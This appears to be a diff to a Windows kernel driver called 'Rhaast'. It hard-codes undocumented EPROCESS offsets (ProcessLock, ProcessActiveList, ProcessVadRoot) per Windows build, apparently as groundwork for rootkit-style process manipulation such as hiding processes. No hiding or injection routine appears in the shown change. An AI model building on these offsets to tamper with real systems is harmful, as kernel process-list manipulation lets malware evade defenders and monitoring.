@@ -16,18 +16,7 @@ NTSTATUS RhaastEntry(
 
     PUTS( "Rhaast loaded" );
 
-    Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad; 
-
-    /* print driver object data */
-    PRINTF( 
-        "Rhaast Driver Object:  \n"
-        " - Type          : %x  \n"
-        " - Driver Name   : %ls \n"
-        " - NtBuildNumber : %ld \n",
-        Instance.DriverObject->Type,
-        Instance.DriverObject->DriverName.Buffer,
-        *NtBuildNumber
-    )
+    Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad;
 
     /* init driver and other resources/info */
     if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
@@ -53,15 +42,81 @@ NTSTATUS RhaastEntry(
 NTSTATUS RhaastInit(
     VOID
 ) {
-    RTL_OSVERSIONINFOW OsVersion = { sizeof( RTL_OSVERSIONINFOW ) };
+    NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    /* get windows version */
-    if ( RtlGetVersion( &OsVersion ) ) {
-        return STATUS_UNSUCCESSFUL;
+    Instance.WindowsBuild = *NtBuildNumber;
+
+    /* set ProcessLock offset */
+    switch ( *NtBuildNumber  )
+    {
+        case WINBUILD_1507:
+        case WINBUILD_1511:
+        case WINBUILD_1607:
+        case WINBUILD_1703:
+        case WINBUILD_1709:
+        case WINBUILD_1803:
+        case WINBUILD_1809: {
+            Instance.Ofs.ProcessLock = 0x2d8;
+            break;
+        }
+
+        case WINBUILD_1903:
+        case WINBUILD_1909: {
+            Instance.Ofs.ProcessLock = 0x2e0;
+            break;
+        }
+
+        default: {
+            Instance.Ofs.ProcessLock = 0x438;
+            break;
+        }
     }
 
-    /* set windows build number */
-    Instance.WindowsBuild = OsVersion.dwBuildNumber;
+    /* set ProcessActiveList offset */
+    switch ( Instance.WindowsBuild )
+    {
+        case WINBUILD_1507:
+        case WINBUILD_1511:
+        case WINBUILD_1607:
+        case WINBUILD_1903:
+        case WINBUILD_1909: {
+            Instance.Ofs.ProcessActiveList = 0x2f0;
+            break;
+        }
+
+        case WINBUILD_1703:
+        case WINBUILD_1709:
+        case WINBUILD_1803:
+        case WINBUILD_1809: {
+            Instance.Ofs.ProcessActiveList = 0x2e8;
+            break;
+        }
+
+        default: {
+            Instance.Ofs.ProcessActiveList = 0x448;
+            break;
+        }
+    }
+
+    /* set other offsets
+     * NOTE:
+     *      I am using Windows 11 22h2 as my test machine so
+     *      i haven't set other offsets for other versions.
+     *      todo do it next. 
+     */
+    switch ( Instance.WindowsBuild )
+    {
+        case WINBUILD_1122H2: {
+            Instance.Ofs.ProcessVadRoot = 0x7d8;
+            break;
+        }
+
+        default: {
+            NtStatus = STATUS_NOT_SUPPORTED;
+        }
+    }
+
+    return NtStatus;
 }
 
 /**
@@ -75,10 +130,9 @@ NTSTATUS RhaastInit(
 VOID RhaastUnLoad(
     IN PDRIVER_OBJECT DriverObject
 ) {
-    PUTS( "Starting to unload driver & resources" ); 
+    PUTS( "Starting to unload driver & resources" );
 
-    /* register callbacks */
-    // RsCallbacksUnRegister();
+    /* TODO: free up memory & resources */
 
     PUTS( "Finished cleanup. Cya" ) 
 }
